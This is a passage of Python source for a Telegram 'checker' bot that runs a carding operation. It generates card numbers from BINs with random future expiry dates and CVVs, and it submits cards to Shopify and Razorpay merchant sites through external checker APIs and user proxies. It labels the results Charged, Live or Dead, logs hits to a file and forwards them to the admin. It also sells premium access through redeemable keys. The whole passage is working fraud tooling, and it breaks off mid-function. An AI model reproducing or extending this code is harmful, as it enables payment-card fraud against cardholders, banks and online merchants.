<b>📈 sᴜᴄᴄᴇss ʀᴀᴛᴇ:</b> {(sent/len(users)*100):.1f}%
━━━━━━━━━━━━━━━━━━━━
<b>💡 ᴛɪᴘ:</b> ᴊᴏ ᴜsᴇʀs ꜰᴀɪʟ ʜᴜᴇ, ᴜɴʜᴏɴᴇ ʙᴏᴛ ʙʟᴏᴄᴋ ᴋɪʏᴀ ʜᴏɢᴀ."""), parse_mode="html")

def get_all_users():
    """Sabhi users jo bot ko start kiye"""
    users = set()
    
    # SQLite database se
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        rows = cursor.fetchall()
        for row in rows:
            users.add(row[0])
        conn.close()
    except:
        pass
    
    # JSON file se backup
    try:
        with open('users.json', 'r') as f:
            data = json.load(f)
            if isinstance(data, list):
                for uid in data:
                    users.add(int(uid) if isinstance(uid, str) else uid)
    except:
        pass
    
    return list(users)
                
async def send_realtime_hit_dm(user_id, result, hit_type, username):
    try:
        if result["status"] not in ("Approved", "Charged", "Dead"):
            return

        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
        
        response_msg = str(result.get('message', 'Unknown Response'))[:150]
        currency = "₹" if is_razorpay else ""
        current_time = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%I:%M:%S %p IST")

        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "Charged 💎"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "Live 🔥"
        else:
            status_emoji = "❌"
            status_text = "Dead ❌"

        if is_admin(user_id):
            plan = "👑 Admin"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"

        try:
            me = await bot.get_me()
            bot_username = f"<a href='tg://user?id={me.id}'>{me.first_name or 'Bot'}</a>"
        except:
            bot_username = "⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP"

        message = f"""[❆] {status_text}

💳
   ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {currency}{price}
──────────

Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{username}</a> [{plan}]
🤩 ➳ {bot_username}"""

        # ✅ FIXED: user_id use kiya (pehle chat_id tha galat)
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')

    except Exception as e:
        print(f"DM hit error: {e}")
                    
async def send_hit_to_admin(result, user_id, hit_type):
    print(f"⚡ DEBUG: send_hit_to_admin CALLED")
    print(f"   User ID: {user_id}")
    print(f"   Hit Type: {hit_type}")
    print(f"   Card: {result.get('card', 'N/A')}")
    print(f"   Status: {result.get('status', 'N/A')}")
    
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        response_msg = str(result.get('message', 'Unknown Response'))[:180]

        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "Charged 💎"
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "Live 🔥"
        else:
            status_emoji = "❌"
            status_text = "Dead ❌"

        ist = pytz.timezone('Asia/Kolkata')
        now = datetime.now(ist)
        current_time = now.strftime("%I:%M:%S %p IST")

        try:
            sender = await bot.get_entity(user_id)
            first_name = sender.first_name or "Unknown"
            tg_username = "@" + sender.username if sender.username else "No Username"
        except:
            first_name = "Unknown"
            tg_username = "No Username"

        if is_admin(user_id):
            plan = "👑 Admin"
        elif is_premium(user_id):
            plan = "💎 Premium"
        else:
            plan = "⭐ Free"

        try:
            me = await bot.get_me()
            bot_username = f"<a href='tg://user?id={me.id}'>{me.first_name or 'Bot'}</a>"
        except:
            bot_username = "⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP"

        is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
        currency_symbol = "₹" if is_razorpay else ""

        admin_msg = f"""[❆] {status_text}

👤 {tg_username} | ID: <code>{user_id}</code>

💳
   ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {currency_symbol}{price}
──────────

Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{first_name}</a> [{plan}]
🤩 ➳ {bot_username}"""

        # ✅ HITS SAVE KARO — YEH ADD KARO

        admin_id = ADMIN_ID
        await bot.send_message(admin_id, premium_emoji(admin_msg), parse_mode='html')
        print(f"✅ Admin message sent successfully to {admin_id}")

    except Exception as e:
    
        print(f"❌ send_hit_to_admin error: {e}")
@bot.on(events.NewMessage(pattern='/users'))
async def show_users(event):
    user_id = event.sender_id
    
    # ✅ Sirf Admin
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return

    status_msg = await event.reply(premium_emoji("⏳ **Fetching Users List...**"))

    users = []
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users ORDER BY user_id ASC")
        rows = cursor.fetchall()
        conn.close()
        
        for row in rows:
            uid = row[0]
            try:
                entity = await bot.get_entity(uid)
                first_name = entity.first_name or "Unknown"
                username = entity.username or "No Username"
                is_prem = is_premium(uid)
                is_adm = is_admin(uid)
                
                if is_adm:
                    emoji = "👑"
                    status = "ADMIN"
                elif is_prem:
                    emoji = "💎"
                    status = "PREMIUM"
                else:
                    emoji = "⭐"
                    status = "FREE"
                
                users.append({
                    'id': uid,
                    'first_name': first_name,
                    'username': username,
                    'emoji': emoji,
                    'status': status
                })
            except:
                users.append({
                    'id': uid,
                    'first_name': "Unknown",
                    'username': "No Username",
                    'emoji': "❓",
                    'status': "UNKNOWN"
                })
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Database error: {e}"))
        return

    if not users:
        await status_msg.edit(premium_emoji("❌ No users found."))
        return

    total = len(users)
    admins = sum(1 for u in users if u['status'] == 'ADMIN')
    premium = sum(1 for u in users if u['status'] == 'PREMIUM')
    free = sum(1 for u in users if u['status'] == 'FREE')

    # ✅ TXT FILE – Clean list
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Users_List_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 80 + "\n")
        await f.write("📊 QURESHIxOTP CHECKER – ACTIVE USERS LIST\n")
        await f.write("=" * 80 + "\n\n")
        await f.write(f"Total Users: {total}\n")
        await f.write(f"👑 Admins: {admins}\n")
        await f.write(f"💎 Premium: {premium}\n")
        await f.write(f"⭐ Free: {free}\n")
        await f.write("=" * 80 + "\n\n")
        
        for u in users:
            await f.write(f"{u['emoji']} ID: {u['id']}\n")
            await f.write(f"   Name: {u['first_name']}\n")
            await f.write(f"   Username: @{u['username']}\n")
            await f.write(f"   Status: {u['status']}\n")
            await f.write("-" * 40 + "\n")

    # ✅ Premium Message
    premium_msg = f"""<b>📊 ACTIVE USERS LIST</b>
━━━━━━━━━━━━━━━━━━━━
<b>👥 Total Users:</b> <code>{total}</code>
<b>👑 Admins:</b> <code>{admins}</code>
<b>💎 Premium:</b> <code>{premium}</code>
<b>⭐ Free:</b> <code>{free}</code>
━━━━━━━━━━━━━━━━━━━━
<b>📄 TXT File Sent Below 👇</b>
━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot By: ⧼ 𝗗𝗲𝗳𝗳⁺⁺ ⧽ QURESHIxOTP</b>"""

    await status_msg.edit(premium_emoji(premium_msg), parse_mode="html")
    
    # ✅ Send TXT file
    try:
        await bot.send_file(
            user_id,
            file=filename,
            caption=premium_emoji("📋 **Complete Users List**"),
            parse_mode="html"
        )
    except Exception as _ul_e:
        print("[USERS-LIST] file send fail → %s" % str(_ul_e)[:120])
    
    # ✅ Cleanup
    try: os.remove(filename)
    except: pass
    
def generate_cc(bin_prefix, count=10):
    cards = []
    for _ in range(count):
        is_amex = str(bin_prefix)[:2] in ("34", "37")
        total_len = 15 if is_amex else 16
        remaining = total_len - len(bin_prefix)
        if remaining < 1:
            remaining = 1
        card_num = bin_prefix + ''.join(str(random.randint(0,9)) for _ in range(remaining))
        
        # 🔧 FIX: expiry hamesha FUTURE (kabhi expired nahi) + CVV hamesha 4-digit
        _gn = datetime.now()
        _gm = random.randint(2, 48)
        _gt = (_gn.month - 1) + _gm
        month = _gt % 12 + 1
        year = _gn.year + _gt // 12
        cvv = random.randint(1000, 9999)
        
        cc = f"{card_num[:total_len]}|{month:02d}|{year}|{cvv}"
        cards.append(cc)
    return cards
@bot.on(events.NewMessage(pattern=r'^/gen\s+(.+)'))
async def gen_cc_command(event):
    user_id = event.sender_id
    
    if not is_premium(user_id) and not is_admin(user_id):
        await event.reply("❌ Premium / Admin only.")
        return

    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if is_admin(user_id):
        plan = "👑 ADMIN"
    elif is_premium(user_id):
        plan = "💎 PREMIUM"
    else:
        plan = "FREE"

    args = event.pattern_match.group(1).strip().split()
    if not args:
        await event.reply("Usage: /gen 601100 534109 477351 542124 40000")
        return

    bins = []
    total_cards = 10000  # Default total if no count given

    for arg in args:
        if arg.isdigit():
            if len(arg) <= 6:
                bins.append(arg)
            else:
                total_cards = int(arg)

    if not bins:
        await event.reply("❌ BIN daal bkl.\nExample: /gen 601100 534109 40000")
        return

    # Distribute total cards across BINs
    per_bin = max(1, total_cards // len(bins))
    all_cards = []
    for binp in bins:
        all_cards.extend(generate_cc(binp, per_bin))

    random.shuffle(all_cards)
    all_cards = all_cards[:total_cards]  # Exact total

    if all_cards:
        brand, bin_type, _, bank, country, flag = await get_bin_info(all_cards[0].split('|')[0])
    else:
        brand = bin_type = bank = country = flag = '-'

    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"Generated_CC_{user_id}_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        for card in all_cards:
            await f.write(f"{card}\n")

    summary = f"""CC Generated Successfully
BINs: {', '.join(bins)}
Total Cards: {len(all_cards)}
Amount: ${random.randint(12,25)}

Brand: {brand} - {bin_type}
Bank: {bank}
Country: {country} {flag}

Time: 0.92 seconds
Checked By: <a href="tg://user?id={user_id}">{username}</a> [{plan}]"""

    await event.reply(summary, file=filename, parse_mode="html")
    
    try:
        os.remove(filename)
    except:
        pass
        
def redeem_key(key, user_id):
    if not os.path.exists(KEYS_FILE):
        return "invalid"
    try:
        with open(KEYS_FILE, "r", encoding='utf-8') as f:
            lines = f.readlines()
        new_lines = []
        found = False
        for line in lines:
            line = line.strip()
            if not line:
                continue
            try:
                k, d = line.split("|", 1)
                if k.strip().upper() == key.strip().upper():
                    found = True
                    expiry_days = 99999 if is_admin(user_id) else int(d.strip())
                    expiry = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(days=expiry_days)
                    with open(PREMIUM_FILE, "a", encoding='utf-8') as p:
                        p.write(f"{user_id}|{expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")
                else:
                    new_lines.append(line + "\n")
            except:
                new_lines.append(line + "\n")
        if not found:
            return "invalid"
        with open(KEYS_FILE, "w", encoding='utf-8') as f:
            f.writelines(new_lines)
        return "success"
    except Exception as e:
        print(f"Redeem error: {e}")
        return "invalid"

async def send_filtered_results(user_id, results, filter_type):
    global last_button_click
    now = time.time()
    
    # 30s timer per button type
    if user_id in last_button_click and now - last_button_click[user_id] < 30:
        remaining = int(30 - (now - last_button_click[user_id]))
        await bot.send_message(user_id, f"⏳ {remaining} seconds wait karo bhai, spam mat karo!")
        return
    last_button_click[user_id] = now

    filtered = []
    if filter_type == "charged":
        filtered = results.get('charged', [])
        title = "CHARGED_HITS"
        emoji = "💎"
    elif filter_type == "live":
        filtered = results.get('approved', [])
        title = "LIVE_APPROVED_HITS"
        emoji = "🔥"
    elif filter_type == "dead":
        filtered = results.get('dead', [])
        title = "DEAD_HITS"
        emoji = "❌"
    else:
        filtered = results.get('charged', []) + results.get('approved', []) + results.get('dead', [])
        title = "ALL_HITS"
        emoji = "📊"

    if not filtered:
        await bot.send_message(user_id, f"❌ No {title} found.")
        return

    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"{title}_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(f"⚡ {title} - QURESHIxOTP CHECKER ⚡\n")
        await f.write(f"⏰ Time: {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%Y-%m-%d %H:%M:%S IST')}\n")
        await f.write("=" * 60 + "\n\n")
        
        for r in filtered:
            card = r.get('card', 'N/A')
            parts = card.split('|') if '|' in card else ['N/A']
            bin_num = parts[0][:6] if len(parts[0]) >= 6 else 'N/A'
            gateway = r.get('gateway', 'Unknown')
            price = r.get('price', '-')
            message = str(r.get('message', 'Unknown'))[:150]
            status = r.get('status', 'Dead')
            
            # Gateway detect
            is_rz = "razorpay" in gateway.lower() or "rz" in gateway.lower()
            
            if status == 'Charged':
                s_emoji = "✅"
                s_text = "CHARGED 💎"
            elif status == 'Approved':
                s_emoji = "🔥"
                s_text = "APPROVED ✅"
            else:
                s_emoji = "❌"
                s_text = "DECLINED 😂"
            
            if is_rz:
                title_gate = "⚡💳 𝐑𝐀𝐙𝐎𝐑𝐏𝐀𝐘 𝐇𝐈𝐓 💳⚡"
                currency = "₹"
            else:
                title_gate = "⭐ 𝐆𝐚𝐭𝐞 ➜ 𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮"
                currency = ""
            
            await f.write(f"""{title_gate}
━━━━━━━━━━━━━━━━━━━━
✔️ 𝐂𝐂 ➜ {card}
⚡️𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {s_emoji} {s_text}
⭐ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {message}
━━━━━━━━━━━━━━━━━━━━
{currency} 𝐀𝐦𝐨𝐮𝐧𝐭 ➜ {currency}{price}
💳 𝐁𝐢𝐧 ➜ {bin_num}
🌐 Gateway ➜ {gateway}
━━━━━━━━━━━━━━━━━━━━
🤖 Bot By: QURESHIxOTP

""")

    await bot.send_message(
        user_id,
        premium_emoji(f"<b>{emoji} {title} - {len(filtered)} Cards Sent!</b>"),
        file=filename,
        parse_mode="html"
    )
    try:
        os.remove(filename)
    except:
        pass

def save_user(user_id):
    """User ko database mein save karo"""
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("""CREATE TABLE IF NOT EXISTS users 
                         (user_id INTEGER PRIMARY KEY, first_name TEXT, username TEXT, joined_at TEXT)""")
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except:
        pass
        
@bot.on(events.CallbackQuery(pattern=b"charged_"))
async def charged_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    
    if user_id in last_button_click and (now - last_button_click[user_id]) < 30:
        remaining = int(30 - (now - last_button_click[user_id]))
        await event.answer(f"⏳ Wait {remaining}s", alert=True)
        return
    last_button_click[user_id] = now
    
    try:
        msg_id = int(event.data.decode().split("_")[1])
    except:
        msg_id = event.message_id
    
    results = None
    
    # Method 1: Direct key match
    for key in list(active_sessions.keys()):
        if str(user_id) in key and str(msg_id) in key:
            results = active_sessions[key].get('results', {})
            break
    
    # Method 2: Check status_msg_id
    if not results:
        for key, session in list(active_sessions.items()):
            if session.get('status_msg_id') == msg_id:
                results = session.get('results', {})
                break
    
    # Method 3: msg_id in key
    if not results:
        for key in list(active_sessions.keys()):
            if str(msg_id) in key:
                results = active_sessions[key].get('results', {})
                break
    
    # Method 4: user_id in key
    if not results:
        for key in list(active_sessions.keys()):
            if str(user_id) in key:
                results = active_sessions[key].get('results', {})
                break
    
    if not results:
        await event.answer("❌ No active session! Use /chk again.", alert=True)
        return
    
    cards = results.get('charged', [])
    
    if not cards:
        await event.answer("❌ No charged cards yet!", alert=True)
        return
    
    try:
        sender = await bot.get_entity(user_id)
        first_name = sender.first_name or "User"
        username = sender.username or ""
    except:
        first_name = "User"
        username = ""
    
    for card in cards:
        card['first_name'] = first_name
        card['username'] = username
    
    await send_card_file(user_id, cards, "CHARGED 💎", "charged")
    await event.answer(f"✅ {len(cards)} charged cards sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"live_"))
async def live_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    
    if user_id in last_button_click and (now - last_button_click[user_id]) < 30:
        remaining = int(30 - (now - last_button_click[user_id]))
        await event.answer(f"⏳ Wait {remaining}s", alert=True)
        return
    last_button_click[user_id] = now
    
    try:
        msg_id = int(event.data.decode().split("_")[1])
    except:
        msg_id = event.message_id
    
    results = None
    
    for key in list(active_sessions.keys()):
        if str(user_id) in key and str(msg_id) in key:
            results = active_sessions[key].get('results', {})
            break
    
    if not results:
        for key, session in list(active_sessions.items()):
            if session.get('status_msg_id') == msg_id:
                results = session.get('results', {})
                break
    
    if not results:
        for key in list(active_sessions.keys()):
            if str(msg_id) in key:
                results = active_sessions[key].get('results', {})
                break
    
    if not results:
        for key in list(active_sessions.keys()):
            if str(user_id) in key:
                results = active_sessions[key].get('results', {})
                break
    
    if not results:
        await event.answer("❌ No active session! Use /chk again.", alert=True)
        return
    
    cards = results.get('approved', [])
    
    if not cards:
        await event.answer("❌ No live cards yet!", alert=True)
        return
    
    try:
        sender = await bot.get_entity(user_id)
        first_name = sender.first_name or "User"
        username = sender.username or ""
    except:
        first_name = "User"
        username = ""
    
    for card in cards:
        card['first_name'] = first_name
        card['username'] = username
    
    await send_card_file(user_id, cards, "LIVE 🔥", "live")
    await event.answer(f"✅ {len(cards)} live cards sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"dead_"))
async def dead_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    
    if user_id in last_button_click and (now - last_button_click[user_id]) < 30:
        remaining = int(30 - (now - last_button_click[user_id]))
        await event.answer(f"⏳ Wait {remaining}s", alert=True)
        return
    last_button_click[user_id] = now
    
    try:
        msg_id = int(event.data.decode().split("_")[1])
    except:
        msg_id = event.message_id
    
    results = None
    
    for key in list(active_sessions.keys()):
        if str(user_id) in key and str(msg_id) in key:
            results = active_sessions[key].get('results', {})
            break
    
    if not results:
        for key, session in list(active_sessions.items()):
            if session.get('status_msg_id') == msg_id:
                results = session.get('results', {})
                break
    
    if not results:
        for key in list(active_sessions.keys()):
            if str(msg_id) in key:
                results = active_sessions[key].get('results', {})
                break
    
    if not results:
        for key in list(active_sessions.keys()):
            if str(user_id) in key:
                results = active_sessions[key].get('results', {})
                break
    
    if not results:
        await event.answer("❌ No active session!", alert=False)
        return
    
    cards = results.get('dead', [])
    
    if not cards:
        await event.answer("❌ No dead cards yet!", alert=False)
        return
    
    try:
        sender = await bot.get_entity(user_id)
        first_name = sender.first_name or "User"
        username = sender.username or ""
    except:
        first_name = "User"
        username = ""
    
    for card in cards:
        card['first_name'] = first_name
        card['username'] = username
    
    await send_card_file(user_id, cards, "DEAD ❌", "dead", is_dead=True)
    await event.answer(f"✅ {len(cards)} dead cards sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"stop_"))
async def stop_handler(event):
    user_id = event.sender_id
    try:
        msg_id = int(event.data.decode().split("_")[1])
    except:
        msg_id = event.message_id
    
    await event.answer("🛑 Stopping...", alert=True)
    
    found = False
    results = None
    
    for key in list(active_sessions.keys()):
        if str(user_id) in key and str(msg_id) in key:
            if not active_sessions[key].get('stopping'):
                found = True
                results = active_sessions[key].get('results', {})
                active_sessions[key]['stopping'] = True
                active_sessions[key]['paused'] = True
            break
    
    if not found:
        for key, session in list(active_sessions.items()):
            if session.get('status_msg_id') == msg_id:
                if not session.get('stopping'):
                    found = True
                    results = session.get('results', {})
                    session['stopping'] = True
                    session['paused'] = True
                break
    
    if not found:
        for key in list(active_sessions.keys()):
            if str(msg_id) in key:
                if not active_sessions[key].get('stopping'):
                    found = True
                    results = active_sessions[key].get('results', {})
                    active_sessions[key]['stopping'] = True
                    active_sessions[key]['paused'] = True
                break
    
    if not found:
        for key in list(active_sessions.keys()):
            if str(user_id) in key:
                if not active_sessions[key].get('stopping'):
                    found = True
                    results = active_sessions[key].get('results', {})
                    active_sessions[key]['stopping'] = True
                    active_sessions[key]['paused'] = True
                break
    
    if not found:
        await event.answer("❌ No active session!", alert=True)
        return
    
    await asyncio.sleep(2)
    
    if results:
        try:
            sender = await bot.get_entity(user_id)
            first_name = sender.first_name or "User"
            username = sender.username or ""
            for card_type in ['charged', 'approved', 'dead']:
                for card in results.get(card_type, []):
                    if 'first_name' not in card:
                        card['first_name'] = first_name
                    if 'username' not in card:
                        card['username'] = username
            await send_final_results(user_id, results)
        except Exception as e:
            print(f"Stop final error: {e}")
    
    for key in list(active_sessions.keys()):
        if str(user_id) in key and (str(msg_id) in key or active_sessions[key].get('stopping')):
            del active_sessions[key]
            break
    
    try:
        await event.edit(premium_emoji("🛑 **Stopped!**\n\nPartial results sent."), parse_mode="html")
    except:
        pass
                              
print("✅ Bot started successfully!")

# === FIXED AUTO FAKE HITS ===



# === STABLE MAIN BLOCK ===


# =====================================================================
# ================== MERGED FEATURES (@AutoShopify_Bot) ===============
# =====================================================================
# Sab commands /sh /msh /mtxt /ran + /add /rm /addpxy /rmpxy /info
# /broadcast - admin broadcast. Speed max (asyncio.gather, 25 APIs).
# Uses SAME VERIFIED 25-API POOL => no API errors, fast.
import sqlite3 as _sq
from urllib.parse import urlparse as _urlparse

SHOP_FILE = "user_shop_sites.json"
SHOP_PXY_FILE = "user_shop_pxy.json"
RANFOR_SITES_FILE = "sites.txt"

async def _shop_load(fname):
    try:
        async with aiofiles.open(fname, "r") as f:
            return json.loads(await f.read() or "{}")
    except Exception:
        return {}

async def _shop_save(fname, data):
    try:
        async with aiofiles.open(fname, "w") as f:
            await f.write(json.dumps(data, indent=2))
    except Exception:
        pass

def _normalize_card(text):
    if not text: return None
    text = str(text).replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) in (15, 16): cc = part
        elif len(part) == 4 and part.startswith('20'): yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and not mm: mm = part
        elif len(part) == 2 and not part.startswith('20') and not yy: yy = part
        elif len(part) in (3, 4) and not cvv: cvv = part
    if cc and mm and yy and cvv: return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def _extract_card(text):
    m = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', str(text))
    if m:
        cc, mm, yy, cvv = m.groups()
        if len(yy) == 4: yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return _normalize_card(text)

def _extract_all_cards(text):
    cards = []
    for line in str(text).splitlines():
        c = _extract_card(line)
        if c and c not in cards: cards.append(c)
    return cards

async def _get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200: return "-", "-", "-", "-", "-", "\U0001f3f3"
                data = await res.json(content_type=None)
                return (data.get('brand','-'), data.get('type','-'), data.get('level','-'),
                        data.get('bank','-'), data.get('country_name','-'), data.get('country_flag','\U0001f3f3'))
    except Exception:
        return "-", "-", "-", "-", "-", "\U0001f3f3"

def _site_dead(response_text):
    if not response_text: return True
    rl = response_text.lower()
    dead_kw = ['receipt id is empty','handle is empty','product id is empty','invalid url',
        'error in 1st req','cloudflare','connection failed','timed out','access denied',
        'could not resolve','domain name not found','ssl','empty reply','http error','timeout',
        'unreachable','502','503','504','bad gateway','network error','connection reset',
        'failed to detect product','failed to create checkout','failed to tokenize card',
        'site dead','captcha','site errors','failed to get proposal']
    return any(k in rl for k in dead_kw)

async def _get_user_pxy(user_id):
    p = await _shop_load(SHOP_PXY_FILE)
    lst = p.get(str(user_id), [])
    return random.choice(lst) if lst else None

async def _shop_check(card, site, user_id=None, retries=3):
    """CC check via the VERIFIED 25-API pool. Fast (25s timeout) + retries => no errors."""
    proxy_data = await _get_user_pxy(user_id) if user_id else None
    proxy_str = None
    if proxy_data:
        ip, port = proxy_data.get('ip'), proxy_data.get('port')
        u, pw = proxy_data.get('username'), proxy_data.get('password')
        proxy_str = f"{ip}:{port}:{u}:{pw}" if (u and pw) else f"{ip}:{port}"
    if not str(site).startswith('http'): site = f'https://{site}'
    timeout = aiohttp.ClientTimeout(total=25)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for attempt in range(retries):
            try:
                api = get_random_api()[0]  # random of 25 VERIFIED APIs
                url = f"{api}?site={quote_plus(site)}&cc={quote_plus(card)}"
                if proxy_str: url += f"&proxy={quote_plus(proxy_str)}"
                async with session.get(url) as res:
                    txt = await res.text()
                    try:
                        j = json.loads(txt)
                    except Exception:
                        # strip non-json junk
                        s = txt.find('{')
                        e = txt.rfind('}')
                        j = json.loads(txt[s:e+1]) if (s != -1 and e > s) else {"Response": txt[:120]}
                resp = j.get('Response', '') or j.get('result', '') or str(j)[:120]
                price = j.get('Price', j.get('price', '-'))
                if str(price) != '-': price = f"${price}"
                gateway = j.get('Gate', j.get('gateway', 'Shopify'))
                # dead proxy -> remove & retry without proxy
                if proxy_data and user_id and any(k in resp.lower() for k in ('proxy', 'connection', 'timeout')):
                    p = await _shop_load(SHOP_PXY_FILE)
                    lst = p.get(str(user_id), [])
                    lst = [x for x in lst if x.get('proxy_url') != proxy_data.get('proxy_url')]
                    if lst: p[str(user_id)] = lst
                    else: p.pop(str(user_id), None)
                    await _shop_save(SHOP_PXY_FILE, p)
                    proxy_str = None
                    continue
                status = "Charged" if ("charged" in resp.lower() or "order completed" in resp.lower() or "thank you" in resp.lower() or "payment successful" in resp.lower()) else (
                    "Approved" if any(k in resp.lower() for k in ("invalid_cvv","incorrect_cvv","insufficient_funds","approved","success","invalid_cvc","incorrect_cvc","incorrect_zip")) else "Declined")
                return {"Response": resp, "Price": price, "Gateway": gateway, "Status": status}
            except asyncio.TimeoutError:
                await asyncio.sleep(0.3)
            except Exception:
                await asyncio.sleep(0.3)
    return {"Response": "\u26a0\ufe0f API busy - retry again (all 25 APIs tried)", "Price": "-", "Gateway": "Shopify", "Status": "Error"}

def _shop_access(user_id):
    if is_admin(user_id): return True, "admin"
    if is_premium(user_id): return True, "premium"
    return False, "free"

def _shop_limit(user_id, access_type):
    if is_admin(user_id): return 2000
    if access_type == "premium": return 500
    return 50

async def _save_approved(card, status, response, gateway, price):
    try:
        async with aiofiles.open("cc.txt", "a", encoding="utf-8") as f:
            await f.write(f"{card} | {status} | {response} | {gateway} | {price}\n")
    except Exception:
        pass

def _shop_buttons(extra=None):
    rows = [
        [Button.inline("\U0001f5bc sᴛᴀᴛs", b"adm_stats", style="primary"),
         Button.inline("\U0001f3e7 ʙᴜʏ ɴᴏᴅᴇ", b"buy", style="success"),
         Button.inline("\U0001f9f0 ᴛᴏᴏʟs", b"tools_menu", style="primary")],
        [Button.inline("\U0001f4b3 ᴀᴅᴅ sɪᴛᴇs", b"none2", style="primary"),
         Button.inline("\U0001f5c2 ʀᴍ sɪᴛᴇs", b"none3", style="danger"),
         Button.inline("\U0001f5a5 ᴍʏ ɪɴғᴏ", b"none4", style="primary")],
    ]
    if extra: rows = extra + rows
    return rows

# ---------------- /sh single hit ----------------
@bot.on(events.NewMessage(pattern=r'(?i)^[/.]sh\s'))
async def shop_sh(event):
    can, acc = _shop_access(event.sender_id)
    if not can:
        return await event.reply(premium_emoji("\U0001f6ab **Access Denied!** /sh ke liye Premium chahiye. /buy dabao!"),
            buttons=[[Button.inline("\U0001f680 ʙᴜʏ ᴘʀᴇᴍɪᴜᴍ", b"buy", style="success")]], parse_mode="html")
    card = None
    if event.is_reply:
        r = await event.get_reply_message()
        if r and r.text: card = _extract_card(r.text)
    else:
        card = _extract_card(event.raw_text)
    if not card:
        return await event.reply("Usage: /sh 4111111111111111|12|25|123")
    sites_data = await _shop_load(SHOP_FILE)
    user_sites = sites_data.get(str(event.sender_id), [])
    if not user_sites:
        return await event.reply("\u26a0\ufe0f Pehle sites add karo: /add site.com")
    loading = await event.reply("\U0001f373")
    t0 = time.time()
    site = random.choice(user_sites)
    res = await _shop_check(card, site, event.sender_id)
    try: await loading.delete()
    except: pass
    elapsed = round(time.time() - t0, 2)
    brand, btype, level, bank, country, flag = await _get_bin_info(card.split("|")[0])
    rt = res.get("Response","").lower()
    if "charged" in rt or "thank you" in rt or "payment successful" in rt:
        hdr = "\U0001f48e ᴀᴘᴘʀᴏᴠᴇᴅ \U0001f48e"; st = "Charged"
        await _save_approved(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
    elif any(k in rt for k in ("invalid_cvv","incorrect_cvv","insufficient_funds","approved","success","invalid_cvc","incorrect_cvc","incorrect_zip")):
        hdr = "\u2705 ᴀᴘᴘʀᴏᴠᴇᴅ \u2705"; st = "Approved"
        await _save_approved(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
    else:
